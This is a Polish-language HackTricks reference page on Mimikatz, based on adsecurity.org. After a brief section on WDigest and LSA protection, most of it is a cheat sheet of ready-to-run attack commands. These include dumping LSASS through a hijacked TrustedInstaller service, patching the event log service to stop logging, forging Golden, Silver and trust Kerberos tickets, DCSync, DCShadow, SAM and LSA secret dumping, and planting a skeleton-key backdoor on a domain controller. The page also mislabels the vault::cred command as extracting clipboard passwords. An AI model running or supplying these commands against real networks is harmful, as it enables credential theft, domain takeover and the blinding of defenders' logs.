# Mimikatz

<details>

<summary><strong>Dowiedz się, jak hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Pracujesz w **firmie zajmującej się cyberbezpieczeństwem**? Chcesz zobaczyć swoją **firmę reklamowaną w HackTricks**? A może chcesz mieć dostęp do **najnowszej wersji PEASS lub pobrać HackTricks w formacie PDF**? Sprawdź [**PLAN SUBSKRYPCYJNY**](https://github.com/sponsors/carlospolop)!
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* **Dołącz do** [**💬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR do** [**repozytorium hacktricks**](https://github.com/carlospolop/hacktricks) **i** [**repozytorium hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

**Ta strona oparta jest na jednej z [adsecurity.org](https://adsecurity.org/?page\_id=1821)**. Sprawdź oryginał, aby uzyskać więcej informacji!

## LM i tekst w pamięci

Od systemu Windows 8.1 i Windows Server 2012 R2 wprowadzono znaczące środki mające na celu ochronę przed kradzieżą poświadczeń:

- **Hashe LM i hasła w postaci tekstu jawnego** nie są już przechowywane w pamięci w celu zwiększenia bezpieczeństwa. Konkretny klucz rejestru, _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_, musi być skonfigurowany z wartością DWORD `0`, aby wyłączyć uwierzytelnianie Digest i zapewnić, że hasła "tekstu jawnego" nie są buforowane w LSASS.

- Wprowadzono **ochronę LSA**, która chroni proces Local Security Authority (LSA) przed nieautoryzowanym odczytem pamięci i wstrzykiwaniem kodu. Jest to osiągane poprzez oznaczenie LSASS jako chronionego procesu. Aktywacja ochrony LSA obejmuje:
1. Modyfikację rejestru w lokalizacji _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ poprzez ustawienie `RunAsPPL` na `dword:00000001`.
2. Wdrożenie obiektu zasad grupy (GPO), który narzuca tę zmianę rejestru na zarządzanych urządzeniach.

Mimo tych zabezpieczeń narzędzia takie jak Mimikatz mogą obejść ochronę LSA, korzystając z określonych sterowników, chociaż takie działania prawdopodobnie zostaną zarejestrowane w dziennikach zdarzeń.

### Przeciwdziałanie usunięciu uprawnienia SeDebugPrivilege

Administratorzy zwykle mają uprawnienie SeDebugPrivilege, które umożliwia im debugowanie programów. To uprawnienie można ograniczyć, aby zapobiec nieautoryzowanym zrzutom pamięci, powszechnej technice wykorzystywanej przez atakujących do wydobycia poświadczeń z pamięci. Jednak nawet po usunięciu tego uprawnienia, konto TrustedInstaller wciąż może wykonywać zrzuty pamięci, korzystając z dostosowanej konfiguracji usługi:
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
To pozwala na zrzut pamięci `lsass.exe` do pliku, który można następnie analizować na innym systemie w celu wydobycia poświadczeń:
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Opcje Mimikatz

Modyfikacja dziennika zdarzeń w Mimikatz polega na dwóch podstawowych działaniach: usuwaniu dzienników zdarzeń i łataniu usługi Zdarzenia w celu zapobiegania rejestrowaniu nowych zdarzeń. Poniżej znajdują się polecenia do wykonania tych działań:

#### Usuwanie dzienników zdarzeń

- **Polecenie**: To działanie ma na celu usunięcie dzienników zdarzeń, utrudniając śledzenie podejrzanych działań.
- Mimikatz nie dostarcza bezpośredniego polecenia w swojej standardowej dokumentacji do bezpośredniego usuwania dzienników zdarzeń za pomocą wiersza poleceń. Jednak manipulacja dziennikiem zdarzeń zazwyczaj polega na użyciu narzędzi systemowych lub skryptów spoza Mimikatz do czyszczenia konkretnych dzienników (np. za pomocą PowerShell lub Windows Event Viewer).

#### Eksperymentalna funkcja: Łatanie usługi Zdarzenia

- **Polecenie**: `event::drop`
- To eksperymentalne polecenie ma na celu zmodyfikowanie zachowania usługi Rejestrowanie zdarzeń, uniemożliwiając jej rejestrowanie nowych zdarzeń.
- Przykład: `mimikatz "privilege::debug" "event::drop" exit`

- Polecenie `privilege::debug` zapewnia, że Mimikatz działa z niezbędnymi uprawnieniami do modyfikowania usług systemowych.
- Polecenie `event::drop` łata usługę Rejestrowanie zdarzeń.


### Ataki na bilety Kerberos

### Tworzenie Złotego Biletu

Złoty Bilet umożliwia podszywanie się pod użytkownika na poziomie domeny. Kluczowe polecenie i parametry:

- Polecenie: `kerberos::golden`
- Parametry:
- `/domain`: Nazwa domeny.
- `/sid`: Identyfikator zabezpieczeń (SID) domeny.
- `/user`: Nazwa użytkownika, którego podszywanie się ma być wykonane.
- `/krbtgt`: Skrót NTLM konta usługi KDC domeny.
- `/ptt`: Bezpośrednie wstrzyknięcie biletu do pamięci.
- `/ticket`: Zapisanie biletu do późniejszego użycia.

Przykład:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Tworzenie biletu Silver

Bilety Silver umożliwiają dostęp do określonych usług. Kluczowe polecenie i parametry:

- Polecenie: Podobne do Golden Ticket, ale skierowane na konkretne usługi.
- Parametry:
- `/service`: Usługa, którą chcemy zaatakować (np. cifs, http).
- Inne parametry podobne do Golden Ticket.

Przykład:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Tworzenie zaufanego biletu

Zaufane bilety są używane do uzyskiwania dostępu do zasobów między domenami poprzez wykorzystanie relacji zaufania. Kluczowe polecenie i parametry:

- Polecenie: Podobne do Złotego Biletu, ale dla relacji zaufania.
- Parametry:
- `/target`: Pełna nazwa domeny docelowej.
- `/rc4`: Skrót NTLM dla konta zaufania.

Przykład:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### Dodatkowe polecenia Kerberos

- **Wyświetlanie biletów**:
- Polecenie: `kerberos::list`
- Wyświetla wszystkie biletu Kerberos dla bieżącej sesji użytkownika.

- **Przekazanie pamięci podręcznej**:
- Polecenie: `kerberos::ptc`
- Wstrzykuje biletu Kerberos z plików pamięci podręcznej.
- Przykład: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Przekazanie biletu**:
- Polecenie: `kerberos::ptt`
- Umożliwia użycie biletu Kerberos w innej sesji.
- Przykład: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Czyszczenie biletów**:
- Polecenie: `kerberos::purge`
- Usuwa wszystkie biletu Kerberos z sesji.
- Przydatne przed użyciem poleceń manipulacji biletami, aby uniknąć konfliktów.


### Modyfikowanie Active Directory

- **DCShadow**: Tymczasowo sprawia, że maszyna działa jako DC do manipulacji obiektami AD.
- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Udaje DC, aby żądać danych hasła.
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Uzyskiwanie dostępu do poświadczeń

- **LSADUMP::LSA**: Wyodrębnia poświadczenia z LSA.
- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Udaje DC, używając danych hasła konta komputera.
- *Brak konkretnego polecenia dla NetSync w oryginalnym kontekście.*

- **LSADUMP::SAM**: Dostęp do lokalnej bazy danych SAM.
- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: Odszyfrowuje tajemnice przechowywane w rejestrze.
- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: Ustawia nowy skrót NTLM dla użytkownika.
- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: Pobiera informacje uwierzytelniania zaufania.
- `mimikatz "lsadump::trust" exit`

### Różne

- **MISC::Skeleton**: Wstrzykuje backdoor do LSASS na DC.
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### Eskalacja uprawnień

- **PRIVILEGE::Backup**: Uzyskuje uprawnienia do tworzenia kopii zapasowych.
- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Uzyskuje uprawnienia debugowania.
- `mimikatz "privilege::debug" exit`

### Wydobywanie poświadczeń

- **SEKURLSA::LogonPasswords**: Wyświetla poświadczenia dla zalogowanych użytkowników.
- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Wyodrębnia biletu Kerberos z pamięci.
- `mimikatz "sekurlsa::tickets /export" exit`

### Manipulacja SID i tokenem

- **SID::add/modify**: Zmienia SID i SIDHistory.
- Dodaj: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- Modyfikuj: *Brak konkretnego polecenia dla modyfikacji w oryginalnym kontekście.*

- **TOKEN::Elevate**: Udaje tokeny.
- `mimikatz "token::elevate /domainadmin" exit`

### Usługi terminalowe

- **TS::MultiRDP**: Pozwala na wielokrotne sesje RDP.
- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: Wyświetla sesje TS/RDP.
- *Brak konkretnego polecenia dla TS::Sessions w oryginalnym kontekście.*

### Schowek

- Wyodrębnia hasła z Schowka systemowego Windows.
- `mimikatz "vault::cred /patch" exit`


<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Czy pracujesz w **firmie zajmującej się cyberbezpieczeństwem**? Chcesz zobaczyć swoją **firmę reklamowaną w HackTricks**? A może chcesz mieć dostęp do **najnowszej wersji PEASS lub pobrać HackTricks w formacie PDF**? Sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* **Dołącz do** [**💬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR do** [**repozytorium hacktricks**](https://github.com/carlospolop/hacktricks) **i** [**repozytorium hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
